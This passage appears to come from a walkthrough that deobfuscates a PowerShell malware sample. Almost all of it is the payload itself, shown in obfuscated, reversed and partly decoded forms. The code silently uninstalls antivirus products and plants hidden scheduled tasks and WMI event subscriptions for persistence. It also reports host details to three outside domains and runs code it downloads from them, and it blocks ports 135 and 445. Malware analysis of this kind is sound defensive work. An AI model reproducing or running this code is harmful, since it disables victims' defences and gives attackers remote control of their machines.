lluhfq+hfqn-tuo9Gf)llun1vK '+'hfq+hfq,0 ,llun1vK ,llun1vK ,4 ,)))5(gnirtsbus.u1vK,HEhfq+h'+'fqf2UHEf('+'ecalper.))5,0(gnirtsbus.u1vK,HEf1UHEf(ecalper.sphfq+hfqmt1vK,OgpDMC_SPOgp(hfq+hfqecalper.lmX.ksat1vK ,ehfq+hfqmaN.ksat1vK(ksaTretsigeR.redlhfq+hfqof'+'1vK						

	{))OgpDMC_SPOgp(sniatnoC.stnemugrA.noihfq+'+'hfqtca1vK(fi					

{yrt			hfq+hfq	hfq+hfq

{ )hfq+hfqsnoitcA.noitinifeD.kshfq+hfqat1vK ni noitcahfq+hfq1vK( hcaerof			

{)metiksat1vK ni k'+'sat1vK(hcaerof		hfq+hfq

)1(sksahfq+hfqTteG.redlof1vK=hfq+hfqmetiksat1vK		

)Ogpfnt1vKyJxOgp(re'+'dloFtehfq+hfqG.vrsts1vK=redhfq+hfqlof1vK		

1 peels-trats		

}		

OgpDMC_SP c-hfq+h'+'fq neddih w- llehsrewhfq+hfq'+'opOgp rt/ F/ '+'Ogpnt1vKyJxfnt1vKhfq+hfqOgp nt/ 06 om/hfq+hfq ETUNIM cs/ etaerc/ sksathcs			hfq+hfq

{ esle }		

OgpDMC_hfq+hfqSP c'+'- llehsrewopOgp rt/ F/ Ogpnt1vKyJxfnt1vKOgphfq+hfq nt/ 06 om/ ETUNIM cs/ '+'metsys ur/ etaerc/ sksathc'+'s			

{)as1v'+'K(fi		

naRteg'+' = nt1vK		

}}naRt'+'eg=fnt1vK{esle})naRteg(+Hhfq+hfqEfyJxswodniWyJxhfq+hfqtfoSorciM'+'HEf=fnt1vK{)as1vK(fi'+'{)2 qe- 3%hf'+'q+hfqi1vK(fi		

}naRteghfq+hfq=fnt1vK{)1 qe- 3%i1vK(fihfq+hfq		

}HEfHEf=h'+'fq+hfqfnt1vK{)0 qe- 3%i1vK(fi	hfq+hfq	

)u1vK,su1vK(hfq+hfqfOxe'+'dnI::]yarra[ = i1vK		

{)su1vK ni u1vK(hcahfq+hfq'+'erof	

}	

OgpllabkcalbOgp'+' rt/ F/ llabkcalb nt/ 021 om'+'/ ETUNIM cs/ etaerc/ sksathcs		

{ esle }	

OgpllabkcalbOgphfq+hfq rt/ F/ llabkcalb nt/ 0'+'21 om/ ETUNIM cs/ '+'metsys ur/ etaerchfq+hfq/ h'+'fq+hfqsks'+'athcs		

{)as1vK(fi	

{)tiod1vK ton-(fi

}{hctac}

)OgpllabkcalbOgp(ksaTteG.)OgpyJxOgp(redloFteG.vrsts1vK=tiod1vK

{yrt

)(tcennoC.vrsts1vK

ecivreS.eludehcS thfq+hfqcejbOmoC- tcejbO-weN = vrsts1vK

)HE'+'fmoc.9u3bb.tHEf,HEfmoc.9rekz.'+'tHEf,HEfmoc.0'+'r3zz.tHEf(@=su1vK

}))6%)modnaR-teG(+6( tnuoC- modnaR-teG9Gf)221..79+09..56+75..84(]][rahc[(nioj- nruterhfq+h'+'fq{)(naRteg noi'+'tcnuf

)Ogprotarhfq+hfqtsinimdAOgp ]eloRnIthfq+hfqliuBswodniW.lapicnirP.ytiruceS[(eloRnIsI.)hfq+hfq)(tnerruCteG::]ytitnedIswodniW.lapicnirP.'+'ytiruceS[]lapicnirPs'+'wodniW.lapichfq+hfqnirP.ytiruceShfq+hfq[(=as1vK
hfq+hfq
HEf)lru1vK(a;)HEfHEf*HEfHEfnioj-))modnar(hfq+hfq,DIUU.)thfq+hfqcudorPmetsySretupmoC_23niW tcejboimw-teg(,EMANREShfq+hfqU:vne1vK,EMANRETUPMOC:vne1hfq+hfqvK(@(+HEfHEf?HEf+v1vK+HEfpsj.a/HEfHEf+HEfHEf2U'+'HEfHEf+HEfHEf1UHEfHEf+HEfHEf//:ptthHEfHEhfq+hfqf=lru1vK}}})b1vK]][rahc[nioj-(xeWoZ'+'I{)hfq+hfq)))]171..0[d1vK]]hfq+hfq[rahc[(nioj-(gnirtS46esaBmorhfq+hfqF::]trehfq+hfqvhfq+hfqnhfq+hfqoc[,)redivorPehfq'+'+h'+'fqcivreSotpyrC1AHS.yhhfq+hfqpargo'+'tpyrC'+'.ytihfq+hfqruchfq+hfqeS tcejh'+'fq+hfqbO-weN(,b1vK(ataDyfirev.r1vK(fi;)p1vK(sretemaraPhfq+hfqtrophfq+hfqmI.r'+'1vK;redivorPecivreSotpyrCASR.yhpargotpyrC.y'+'tiruceS tcejbO-weN=r1vK;10x0,00x0,10x0=tnenopxE.p1vK;)HEfHEf=01aHdLOqfprhfq+hfq7R6YIef1j1vcQUpL2/zlbjpCLDjb58M0C5YluqWknCUeNLh4feqi'+'4Rzxn3cASZ8cwkR0r03mugLbuLp818LicDW0RY/T'+'m2r3K7mlHYIcitzTzv2NN3Mw9IFPj4krWf26VtHbuNnmTN3/'+'v8vgdmpXB1GvXu71oWm2Hhfq+hfqEfHEf(gnirtShfq+hfq46esaBmorF::]trhfq+hf'+'qevnhfq+hfqoc[=shfq+hfqulhfq+hfqudohfq+hf'+'qM.p1vK;srehfq+hfqtemaraPASR.yh'+'pargotpyrC.yhfq+hfqtiruceS tcejbO-weN=p1vK;]c1vK..371[d1vK=b1vK{)371 tg'+'- c1vKhfq+hfq('+'fi;tnuoc.d1vK=c1'+'vK;))(dneotdhfq+hfqaer.)))(maertsesnopserteg.)(hfq+hfqesnopserteg.)u1vK(etaerc::]tseuqerbew.tehfq+hf'+'qn[(redaeRm'+'aertS.'+'O'+'Ihfq+hfq tcejbo-wenhfq+hfq((setybtehfq+hfqg.8ftuhfq+hfq::]gnid'+'ocne.thfq+hfqxet[hfq+hfq'+'=d1vK{)u1vK(a noitcnufHEf=spmt1vK

)H'+'EfddMMyyyy_H'+'Ef tamroF- etaD-teG(+Ogpv1vK?Ogp=v1vhfq+hfqK

'+'tratseron/ sexobgsmsserhfq+hfqpphfq+hfqus/ tneli'+'syrev/ Ogpexe.000sninuyJxerawlaM-itnAyJxsetyberawla'+'MyJxhfq+hfq1~hfq+hf'+'qargorP'+'yJx:COgp c/ dmchfq+hfq

evitcarehfq+hfqtnion/ llatsninuhfq+hfq llhfq+hfqac OgpHEf%hfq+hfqytiruceS notroN%HEf ekil emanOgp erehw hfq+hfqtcudorp exe.cimw b/ trats c/ dmc

evitcaretnion/ llatsninu llac OgpHEhfq+hfqf%suriVitnA%hfq+hfqHEf'+' ekil emanO'+'gp erehw tcudorhfq+hfqp exe.cimw b/ trats c/ dmc

evitcaretn'+'ion/ llatsninu llac hfq+hfqOgpHEf%ytiruceS%HEf ekil emanOgp erehw tcudohfq+hfqrp exe.cimw b/ trats c/ dmc

evitcaretnion/ llatsninu llac OgpHEf%'+'pva%Hhfq+hfqEf ekil emanOgp erehw tcudorp exe.cimw b/ '+'trats c/ dmc

evitcaretnion/ '+'llathfq+hfqsninu llac OgpHEf%tsava%HEf ekil emhfq+hfqanOgp erehw tcudorp exe.cimw b/ trats c/ dmhfq+hfqc

ehfq+hfqvitcaretnionhfq+hfq/ llatsninu llac OgpHEf%%hfq+hfqyksrepsaK%%HEf ekil emanOgp erehw'+' tcudorp exe.cimw b/ trats c/ dmc
'+'
evitcarethfq+hfqnion/ llatsninu llac OgpHEf%tesE%HEf ekil emanOgp erehw tcudorp exe.cimw b/ trhfq+hfqats c/ dmchfq(( )hfqXhfq+]03[EmOHsP0N9+]12[EMOhSP0N9 ( . '(  "; .( $veRbosePrEfERENCe.TOStrIng()[1,3]+'X'-joIn'')(( Get-vARIabLE  lw7ef  ).valUe[-1..-( ( Get-vARIabLE  lw7ef  ).valUe.lenGTh )]-jOiN'')
```

Continuing on by removing more IEX which is `.( $veRbosePrEfERENCe.TOStrIng()[1,3]+'X'-joIn'')` in this case like so

```powershell
$LW7eF=  ")'X'+]31[DillEhs$+]1[dilLEHs$ (. |)29]rAHc[]GNirtS[,)15]rAHc[+65]rAHc[+401]rAHc[((EcalPer.)'$','0N9'(EcalPer.)93]rAHc[]GNirtS[,)401]rAHc[+201]rAHc[+311]rAHc[((EcalPer.)'

 ) '+')43]'+'rahC[]gNIrTS[,)97]rahC[+301]rahC[+211]rahC[((EcalPeR.)69]rahC[]gNIrTS[,)78]rahC[+111]rahC[+09]rahC[((EcalPeR.)hfq38hhfq,)121]rahC['+'+47]rahC[+021]rahC['+'((EcalPeR.)421]'+'rahC[]gNIrTS[,hfq9G'+'fhfq(EcalPeR.)93'+']rahC[]gNIrTS[,)27]rahC[+96'+']rahC[+201]rahC[((EcalPeR.)hfq0N9hfq,)94]rahC[+811]rahC[+57]rahC[((EcalPeR.)hfqF/ astR nt/ eteled/ sksathfq+hfqhcs

F/ 1astR nt/ eteled/ sksathcs'+'

F/ 2ashfq+hfqtR nhfq+hfqt/ eteled/ sksathcs


kcolb=noithfq+hfqca 531=trophfq+hfqlhfq+hfqacol pct=locotorp ni=rid Ogp531ynedOgp=e'+'man elur hfq+hf'+'qdda llawerif llawerifvda hsten

kc'+'olb=noitca 544=troplacolhfq+hfq pct=lohfq+hfqcotorp ni=rid Ogp544ynedO'+'gp='+'hfq+hfqema'+'n elur dda llawerif llawerifvda hsten

35=troptcennoc 1.1.1.1=sserddatcennoc 92556=tropnetsil 4vot4v dda yxorptrop ecafretni exe.hsten'+'
hfq+hfq
dSNDhfq+hfqS 92556 pct hfq+hfqgninepotrop dda llawerif'+' exehfq+hfq.hsten c/ ex'+'e.dmc

}
hfq+hfq
ecroF??? 1 eulaV- DROWD epyT- hfq+hfqnoisserpmoCelbasiD OgpsretemaraPyJxrevreSnamnaLyJxsecivreSyJxteSlortno'+'CtnerruCyJhfq+hfqxMETSYSyJx:MLKHOgp htaP- yt'+'reporPhfq+hfqmetI-teS    

}    
hfq+hfq
5 peels-trats '+'       

})}Ogpdmcimw1vK c- llehhfq+hfqsrewop c/Ogp=etalpmeTeniLdnammoC;Ogpexe.dmcyJx23mets'+'ysyJ'+'xswodnhfq+hfqiwyJx:cOgp=hhfq+hfq'+'taPelbatucexE;e'+'maNeht1'+'vK+OgpcOgp=emaN{@ st'+'nemugrA- OgpnoitpircsbusyJxtoorOgp ecapsemaN- re'+'musnoCtne'+'vEeniLdnammoC ssalC- ecnatsnh'+'fq+hf'+'qIimW-teS(=remusnoC;)pohfq+hfqtS noitcArorrE- };OgpHEfmetsyS_SOfreP_ataDdehfq+hfqttamroFfreP_23niWHEf ASI ec'+'natsnIteg'+'raT EREHW 0063 NIHTIW tnev'+'En'+'oitahfq+hfqcifid'+'oMecnatsnI__ MORF '+'* TCELhfq+hfqESOgp=yreuQhfq+hfq;OgpLQWOgp=egaugna'+'Lhfq+hfqyrehfq+'+'hfquQ;Ogp2vmicyJx'+'toorOgp=ecapSemaNtnevE;emaNeht1vK+OgpfOgp=emaN{@ stnhfq+hfqemug'+'r'+'A- Ogphfq+hfqnoitpircsbusyJxtoorOgp hfq+hfqecapSemaN- retl'+'iFtnevE__ ssalC- ecnatsnIim'+'W-teS(=retliF{@ stnemugrA- OgpnoitpircsbusyJxtoorOgp ecaphfq+hfqsemaN- gnidniBremhfq+hfqusnoCoTr'+'ethfq+hfqliF__ ssalC-hfq+hfq'+' ecnatsnIimW-teS        

)HEfpsj.aaHEf,HEhfq+hfqfpsj.aHEf(ecalper.))5(gnirtsbus.u1vK,HEf2UHEf(ecalper'+'.))5,0(gnirtsbus.uhfq+hfq1vK,HEf1UHEf(ecalper.spmt1v'+'K=dmcimw1vK        

naRteg=e'+'maNeht1vK        
hfq+hfq
{)su1vK nhfq+hfqi u1vK(hcaerof    

hfq+hfqpotS noitcArorrE- };OgpHEfmetsyS_'+'SOfreP_ataDd'+'ettamhfq+hfqroFfrhfq+hfqeP_23niWHEf A'+'SI ecnatsnItegraT EREHhfq+hfqW 0063 '+'NIHTI'+'W tne'+'vEnoitacifidoMecnhfq+'+'hfqatsnI__ MORF * TCELESOgp=yre'+'uQ;Ogphf'+'q+hfqLQWOgp=ega'+'ugn'+'aLyreuQ;Ogp2vmicyJxtoorOgp=ecapSemaNtnevE;OgpllabkcalbOgp=emaN{@ stnemugrA- OgpnoitpircsbusyJxtoorOgp ecapSemaN- retliFtnevE__ ssalC- ecnatsnIimW-teS    

{)1tiod1vKhfq+hfq ton-(fi

'+'hfq+hf'+'q}{hcthfq+hfqac}

Og'+'pHhfq+hfqEfllabkcal'+'bHEf=emaNOgp retlifhfq+hfq- HEfnoitpircsbusyJxtoorHEf ecapS'+'emaN- retliFtn'+'evE__ ssalChfq+hfq- tcejbOIMhfq+hfqW-teG=1thfq+hfqiod1hfq+h'+'fqvhfq+hfqK

{y'+'rt


}

}	

5 peels-trats		

Ogpnt1vKyJxfnthfq+hfq1hfq+hfqv'+'KOgp nt/ nhfq+'+'hfqur/ sksathchfq+hfqs		

1 peels-thfq+hfqrats		

}		

}			

}{hct'+'ac}				

}					

lluhfq+hfqn-tuo9Gf)llun1vK '+'hfq+hfq,0 ,llun1vK ,llun1vK ,4 ,)))5(gnirtsbus.u1vK,HEhfq+h'+'fqf2UHEf('+'ecalper.))5,0(gnirtsbus.u1vK,HEf1UHEf(ecalper.sphfq+hfqmt1vK,OgpDMC_SPOgp(hfq+hfqecalper.lmX.ksat1vK ,ehfq+hfqmaN.ksat1vK(ksaTretsigeR.redlhfq+hfqof'+'1vK						

	{))OgpDMC_SPOgp(sniatnoC.stnemugrA.noihfq+'+'hfqtca1vK(fi					

{yrt			hfq+hfq	hfq+hfq

{ )hfq+hfqsnoitcA.noitinifeD.kshfq+hfqat1vK ni noitcahfq+hfq1vK( hcaerof			

{)metiksat1vK ni k'+'sat1vK(hcaerof		hfq+hfq

)1(sksahfq+hfqTteG.redlof1vK=hfq+hfqmetiksat1vK		

)Ogpfnt1vKyJxOgp(re'+'dloFtehfq+hfqG.vrsts1vK=redhfq+hfqlof1vK		

1 peels-trats		

}		

OgpDMC_SP c-hfq+h'+'fq neddih w- llehsrewhfq+hfq'+'opOgp rt/ F/ '+'Ogpnt1vKyJxfnt1vKhfq+hfqOgp nt/ 06 om/hfq+hfq ETUNIM cs/ etaerc/ sksathcs			hfq+hfq

{ esle }		

OgpDMC_hfq+hfqSP c'+'- llehsrewopOgp rt/ F/ Ogpnt1vKyJxfnt1vKOgphfq+hfq nt/ 06 om/ ETUNIM cs/ '+'metsys ur/ etaerc/ sksathc'+'s			

{)as1v'+'K(fi		

naRteg'+' = nt1vK		

}}naRt'+'eg=fnt1vK{esle})naRteg(+Hhfq+hfqEfyJxswodniWyJxhfq+hfqtfoSorciM'+'HEf=fnt1vK{)as1vK(fi'+'{)2 qe- 3%hf'+'q+hfqi1vK(fi		

}naRteghfq+hfq=fnt1vK{)1 qe- 3%i1vK(fihfq+hfq		

}HEfHEf=h'+'fq+hfqfnt1vK{)0 qe- 3%i1vK(fi	hfq+hfq	

)u1vK,su1vK(hfq+hfqfOxe'+'dnI::]yarra[ = i1vK		

{)su1vK ni u1vK(hcahfq+hfq'+'erof	

}	

OgpllabkcalbOgp'+' rt/ F/ llabkcalb nt/ 021 om'+'/ ETUNIM cs/ etaerc/ sksathcs		

{ esle }	

OgpllabkcalbOgphfq+hfq rt/ F/ llabkcalb nt/ 0'+'21 om/ ETUNIM cs/ '+'metsys ur/ etaerchfq+hfq/ h'+'fq+hfqsks'+'athcs		

{)as1vK(fi	

{)tiod1vK ton-(fi

}{hctac}

)OgpllabkcalbOgp(ksaTteG.)OgpyJxOgp(redloFteG.vrsts1vK=tiod1vK

{yrt

)(tcennoC.vrsts1vK

ecivreS.eludehcS thfq+hfqcejbOmoC- tcejbO-weN = vrsts1vK

)HE'+'fmoc.9u3bb.tHEf,HEfmoc.9rekz.'+'tHEf,HEfmoc.0'+'r3zz.tHEf(@=su1vK

}))6%)modnaR-teG(+6( tnuoC- modnaR-teG9Gf)221..79+09..56+75..84(]][rahc[(nioj- nruterhfq+h'+'fq{)(naRteg noi'+'tcnuf

)Ogprotarhfq+hfqtsinimdAOgp ]eloRnIthfq+hfqliuBswodniW.lapicnirP.ytiruceS[(eloRnIsI.)hfq+hfq)(tnerruCteG::]ytitnedIswodniW.lapicnirP.'+'ytiruceS[]lapicnirPs'+'wodniW.lapichfq+hfqnirP.ytiruceShfq+hfq[(=as1vK
hfq+hfq
HEf)lru1vK(a;)HEfHEf*HEfHEfnioj-))modnar(hfq+hfq,DIUU.)thfq+hfqcudorPmetsySretupmoC_23niW tcejboimw-teg(,EMANREShfq+hfqU:vne1vK,EMANRETUPMOC:vne1hfq+hfqvK(@(+HEfHEf?HEf+v1vK+HEfpsj.a/HEfHEf+HEfHEf2U'+'HEfHEf+HEfHEf1UHEfHEf+HEfHEf//:ptthHEfHEhfq+hfqf=lru1vK}}})b1vK]][rahc[nioj-(xeWoZ'+'I{)hfq+hfq)))]171..0[d1vK]]hfq+hfq[rahc[(nioj-(gnirtS46esaBmorhfq+hfqF::]trehfq+hfqvhfq+hfqnhfq+hfqoc[,)redivorPehfq'+'+h'+'fqcivreSotpyrC1AHS.yhhfq+hfqpargo'+'tpyrC'+'.ytihfq+hfqruchfq+hfqeS tcejh'+'fq+hfqbO-weN(,b1vK(ataDyfirev.r1vK(fi;)p1vK(sretemaraPhfq+hfqtrophfq+hfqmI.r'+'1vK;redivorPecivreSotpyrCASR.yhpargotpyrC.y'+'tiruceS tcejbO-weN=r1vK;10x0,00x0,10x0=tnenopxE.p1vK;)HEfHEf=01aHdLOqfprhfq+hfq7R6YIef1j1vcQUpL2/zlbjpCLDjb58M0C5YluqWknCUeNLh4feqi'+'4Rzxn3cASZ8cwkR0r03mugLbuLp818LicDW0RY/T'+'m2r3K7mlHYIcitzTzv2NN3Mw9IFPj4krWf26VtHbuNnmTN3/'+'v8vgdmpXB1GvXu71oWm2Hhfq+hfqEfHEf(gnirtShfq+hfq46esaBmorF::]trhfq+hf'+'qevnhfq+hfqoc[=shfq+hfqulhfq+hfqudohfq+hf'+'qM.p1vK;srehfq+hfqtemaraPASR.yh'+'pargotpyrC.yhfq+hfqtiruceS tcejbO-weN=p1vK;]c1vK..371[d1vK=b1vK{)371 tg'+'- c1vKhfq+hfq('+'fi;tnuoc.d1vK=c1'+'vK;))(dneotdhfq+hfqaer.)))(maertsesnopserteg.)(hfq+hfqesnopserteg.)u1vK(etaerc::]tseuqerbew.tehfq+hf'+'qn[(redaeRm'+'aertS.'+'O'+'Ihfq+hfq tcejbo-wenhfq+hfq((setybtehfq+hfqg.8ftuhfq+hfq::]gnid'+'ocne.thfq+hfqxet[hfq+hfq'+'=d1vK{)u1vK(a noitcnufHEf=spmt1vK

)H'+'EfddMMyyyy_H'+'Ef tamroF- etaD-teG(+Ogpv1vK?Ogp=v1vhfq+hfqK

'+'tratseron/ sexobgsmsserhfq+hfqpphfq+hfqus/ tneli'+'syrev/ Ogpexe.000sninuyJxerawlaM-itnAyJxsetyberawla'+'MyJxhfq+hfq1~hfq+hf'+'qargorP'+'yJx:COgp c/ dmchfq+hfq

evitcarehfq+hfqtnion/ llatsninuhfq+hfq llhfq+hfqac OgpHEf%hfq+hfqytiruceS notroN%HEf ekil emanOgp erehw hfq+hfqtcudorp exe.cimw b/ trats c/ dmc

evitcaretnion/ llatsninu llac OgpHEhfq+hfqf%suriVitnA%hfq+hfqHEf'+' ekil emanO'+'gp erehw tcudorhfq+hfqp exe.cimw b/ trats c/ dmc

evitcaretn'+'ion/ llatsninu llac hfq+hfqOgpHEf%ytiruceS%HEf ekil emanOgp erehw tcudohfq+hfqrp exe.cimw b/ trats c/ dmc

evitcaretnion/ llatsninu llac OgpHEf%'+'pva%Hhfq+hfqEf ekil emanOgp erehw tcudorp exe.cimw b/ '+'trats c/ dmc

evitcaretnion/ '+'llathfq+hfqsninu llac OgpHEf%tsava%HEf ekil emhfq+hfqanOgp erehw tcudorp exe.cimw b/ trats c/ dmhfq+hfqc

ehfq+hfqvitcaretnionhfq+hfq/ llatsninu llac OgpHEf%%hfq+hfqyksrepsaK%%HEf ekil emanOgp erehw'+' tcudorp exe.cimw b/ trats c/ dmc
'+'
evitcarethfq+hfqnion/ llatsninu llac OgpHEf%tesE%HEf ekil emanOgp erehw tcudorp exe.cimw b/ trhfq+hfqats c/ dmchfq(( )hfqXhfq+]03[EmOHsP0N9+]12[EMOhSP0N9 ( . '(  "; (( Get-vARIabLE  lw7ef  ).valUe[-1..-( ( Get-vARIabLE  lw7ef  ).valUe.lenGTh )]-jOiN'')
```
Will give

```
(' . ( 9N0PShOME[21]+9N0PsHOmE[30]+qfhXqfh) ((qfhcmd /c staqfh+qfhrt /b wmic.exe product where pgOname like fEH%Eset%fEHpgO call uninstall /noinqfh+qfhteractive
'+'
cmd /c start /b wmic.exe product '+'where pgOname like fEH%%Kasperskyqfh+qfh%%fEHpgO call uninstall /qfh+qfhnointeractivqfh+qfhe

cqfh+qfhmd /c start /b wmic.exe product where pgOnaqfh+qfhme like fEH%avast%fEHpgO call uninsqfh+qfhtall'+' /nointeractive

cmd /c start'+' /b wmic.exe product where pgOname like fEqfh+qfhH%avp'+'%fEHpgO call uninstall /nointeractive

cmd /c start /b wmic.exe prqfh+qfhoduct where pgOname like fEH%Security%fEHpgOqfh+qfh call uninstall /noi'+'nteractive

cmd /c start /b wmic.exe pqfh+qfhroduct where pg'+'Oname like '+'fEHqfh+qfh%AntiVirus%fqfh+qfhEHpgO call uninstall /nointeractive

cmd /c start /b wmic.exe productqfh+qfh where pgOname like fEH%Norton Securityqfh+qfh%fEHpgO caqfh+qfhll qfh+qfhuninstall /nointqfh+qfheractive

qfh+qfhcmd /c pgOC:xJy'+'Prograq'+'fh+qfh~1qfh+qfhxJyM'+'alwarebytesxJyAnti-MalwarexJyunins000.exepgO /verys'+'ilent /suqfh+qfhppqfh+qfhressmsgboxes /norestart'+'

Kqfh+qfhv1v=pgO?Kv1vpgO+(Get-Date -Format fE'+'H_yyyyMMddfE'+'H)

Kv1tmps=fEHfunction a(Kv1u){Kv1d='+'qfh+qfh[texqfh+qfht.enco'+'ding]::qfh+qfhutf8.gqfh+qfhetbytes((qfh+qfhnew-object qfh+qfhI'+'O'+'.Strea'+'mReader([nq'+'fh+qfhet.webrequest]::create(Kv1u).getresponseqfh+qfh().getresponsestream())).reaqfh+qfhdtoend());Kv'+'1c=Kv1d.count;if'+'(qfh+qfhKv1c -'+'gt 173){Kv1b=Kv1d[173..Kv1c];Kv1p=New-Object Securitqfh+qfhy.Cryptograp'+'hy.RSAParametqfh+qfhers;Kv1p.Mq'+'fh+qfhoduqfh+qfhluqfh+qfhs=[coqfh+qfhnveq'+'fh+qfhrt]::FromBase64qfh+qfhString(fEHfEqfh+qfhH2mWo17uXvG1BXpmdgv8v'+'/3NTmnNubHtV62fWrk4jPFI9wM3NN2vzTzticIYHlm7K3r2m'+'T/YR0WDciL818pLubLgum30r0Rkwc8ZSAc3nxzR4'+'iqef4hLNeUCnkWqulY5C0M85bjDLCpjblz/2LpUQcv1j1feIY6R7qfh+qfhrpfqOLdHa10=fEHfEH);Kv1p.Exponent=0x01,0x00,0x01;Kv1r=New-Object Securit'+'y.Cryptography.RSACryptoServiceProvider;Kv1'+'r.Imqfh+qfhportqfh+qfhParameters(Kv1p);if(Kv1r.verifyData(Kv1b,(New-Obqfh+qf'+'hject Seqfh+qfhcurqfh+qfhity.'+'Crypt'+'ograpqfh+qfhhy.SHA1CryptoServicqf'+'h+'+'qfheProvider),[coqfh+qfhnqfh+qfhvqfh+qfhert]::Fqfh+qfhromBase64String(-join([char[qfh+qfh]]Kv1d[0..171])))qfh+qfh){I'+'ZoWex(-join[char[]]Kv1b)}}}Kv1url=fqfh+qfhEHfEHhttp://fEHfEH+fEHfEHU1fEHfEH+fEHfEH'+'U2fEHfEH+fEHfEH/a.jspfEH+Kv1v+fEH?fEHfEH+(@(Kvqfh+qfh1env:COMPUTERNAME,Kv1env:Uqfh+qfhSERNAME,(get-wmiobject Win32_ComputerSystemProducqfh+qfht).UUID,qfh+qfh(random))-joinfEHfEH*fEHfEH);a(Kv1url)fEH
qfh+qfh
Kv1sa=([qfh+qfhSecurity.Prinqfh+qfhcipal.Window'+'sPrincipal][Security'+'.Principal.WindowsIdentity]::GetCurrent()qfh+qfh).IsInRole([Security.Principal.WindowsBuilqfh+qfhtInRole] pgOAdministqfh+qfhratorpgO)

funct'+'ion getRan(){qf'+'h+qfhreturn -join([char[]](48..57+65..90+97..122)fG9Get-Random -Count (6+(Get-Random)%6))}

Kv1us=@(fEHt.zz3r'+'0.comfEH,fEHt'+'.zker9.comfEH,fEHt.bb3u9.comf'+'EH)

Kv1stsrv = New-Object -ComObjecqfh+qfht Schedule.Service

Kv1stsrv.Connect()

try{

Kv1doit=Kv1stsrv.GetFolder(pgOxJypgO).GetTask(pgOblackballpgO)

}catch{}

if(-not Kv1doit){

	if(Kv1sa){

		schta'+'sksqfh+qf'+'h /qfh+qfhcreate /ru system'+' /sc MINUTE /mo 12'+'0 /tn blackball /F /tr qfh+qfhpgOblackballpgO

	} else {

		schtasks /create /sc MINUTE /'+'mo 120 /tn blackball /F /tr '+'pgOblackballpgO

	}

	fore'+'qfh+qfhach(Kv1u in Kv1us){

		Kv1i = [array]::Ind'+'exOfqfh+qfh(Kv1us,Kv1u)

	qfh+qfh	if(Kv1i%3 -eq 0){Kv1tnfqfh+qf'+'h=fEHfEH}

		qfh+qfhif(Kv1i%3 -eq 1){Kv1tnf=qfh+qfhgetRan}

		if(Kv1iqfh+q'+'fh%3 -eq 2){'+'if(Kv1sa){Kv1tnf=fEH'+'MicroSoftqfh+qfhxJyWindowsxJyfEqfh+qfhH+(getRan)}else{Kv1tnf=ge'+'tRan}}

		Kv1tn = '+'getRan

		if(K'+'v1sa){

			s'+'chtasks /create /ru system'+' /sc MINUTE /mo 60 /tn qfh+qfhpgOKv1tnfxJyKv1tnpgO /F /tr pgOpowershell -'+'c PSqfh+qfh_CMDpgO

		} else {

qfh+qfh			schtasks /create /sc MINUTE qfh+qfh/mo 60 /tn pgOqfh+qfhKv1tnfxJyKv1tnpgO'+' /F /tr pgOpo'+'qfh+qfhwershell -w hidden qf'+'h+qfh-c PS_CMDpgO

		}

		start-sleep 1

		Kv1folqfh+qfhder=Kv1stsrv.Gqfh+qfhetFold'+'er(pgOxJyKv1tnfpgO)

		Kv1taskitemqfh+qfh=Kv1folder.GetTqfh+qfhasks(1)

qfh+qfh		foreach(Kv1tas'+'k in Kv1taskitem){

			foreach (Kv1qfh+qfhaction in Kv1taqfh+qfhsk.Definition.Actionsqfh+qfh) {

qfh+qfh	qfh+qfh			try{

					if(Kv1actqfh'+'+qfhion.Arguments.Contains(pgOPS_CMDpgO)){	

						Kv1'+'foqfh+qfhlder.RegisterTask(Kv1task.Namqfh+qfhe, Kv1task.Xml.replaceqfh+qfh(pgOPS_CMDpgO,Kv1tmqfh+qfhps.replace(fEHU1fEH,Kv1u.substring(0,5)).replace'+'(fEHU2fqf'+'h+qfhEH,Kv1u.substring(5))), 4, Kv1null, Kv1null, 0,qfh+qfh'+' Kv1null)fG9out-nqfh+qfhull

					}

				}ca'+'tch{}

			}

		}

		starqfh+qfht-sleep 1

		sqfh+qfhchtasks /ruqfh'+'+qfhn /tn pgOK'+'vqfh+qfh1qfh+qfhtnfxJyKv1tnpgO

		start-sleep 5

	}

}


tr'+'y{

Kqfh+qfhvqf'+'h+qfh1doiqfh+qfht1=Get-Wqfh+qfhMIObject -qfh+qfhClass __Eve'+'ntFilter -Name'+'Space fEHrootxJysubscriptionfEH -qfh+qfhfilter pgOName=fEHb'+'lackballfEqfh+qfhHp'+'gO

}caqfh+qfhtch{}q'+'fh+qfh'+'

if(-not qfh+qfhKv1doit1){

    Set-WmiInstance -Class __EventFilter -NameSpace pgOrootxJysubscriptionpgO -Arguments @{Name=pgOblackballpgO;EventNameSpace=pgOrootxJycimv2pgO;QueryLa'+'ngu'+'age=pgOWQLqfh+q'+'fhpgO;Qu'+'ery=pgOSELECT * FROM __Instaqfh'+'+qfhnceModificationEv'+'ent W'+'ITHIN'+' 3600 Wqfh+qfhHERE TargetInstance IS'+'A fEHWin32_Peqfh+qfhrfForqfh+qfhmatte'+'dData_PerfOS'+'_SystemfEHpgO;} -ErrorAction Stopqfh+qfh

    foreach(Kv1u iqfh+qfhn Kv1us){
qfh+qfh
        Kv1theNam'+'e=getRan

        Kv1wmicmd=K'+'v1tmps.replace(fEHU1fEH,Kv1qfh+qfhu.substring(0,5)).'+'replace(fEHU2fEH,Kv1u.substring(5)).replace(fEHa.jspfqfh+qfhEH,fEHaa.jspfEH)

        Set-WmiInstance '+'qfh+qfh-Class __Filqfh+qfhte'+'rToConsuqfh+qfhmerBinding -Namesqfh+qfhpace pgOrootxJysubscriptionpgO -Arguments @{Filter=(Set-W'+'miInstance -Class __EventFi'+'lter -NameSpaceqfh+qfh pgOrootxJysubscriptionqfh+qfhpgO -A'+'r'+'gumeqfh+qfhnts @{Name=pgOfpgO+Kv1theName;EventNameSpace=pgOroot'+'xJycimv2pgO;Quqfh'+'+qfheryqfh+qfhL'+'anguage=pgOWQLpgO;qfh+qfhQuery=pgOSEqfh+qfhLECT *'+' FROM __InstanceMo'+'dificqfh+qfhatio'+'nE'+'vent WITHIN 3600 WHERE Tar'+'getInstan'+'ce ISA fEHWin32_PerfFormattqfh+qfhedData_PerfOS_SystemfEHpgO;} -ErrorAction Stqfh+qfhop);Consumer=(Set-WmiIq'+'fh+qf'+'hnstance -Class CommandLineEv'+'entConsum'+'er -Namespace pgOrootxJysubscriptionpgO -Argumen'+'ts @{Name=pgOcpgO+Kv'+'1theNam'+'e;ExecutablePat'+'qfh+qfhh=pgOc:xJywiqfh+qfhndowsx'+'Jysy'+'stem32xJycmd.exepgO;CommandLineTemplate=pgO/c powersqfh+qfhhell -c 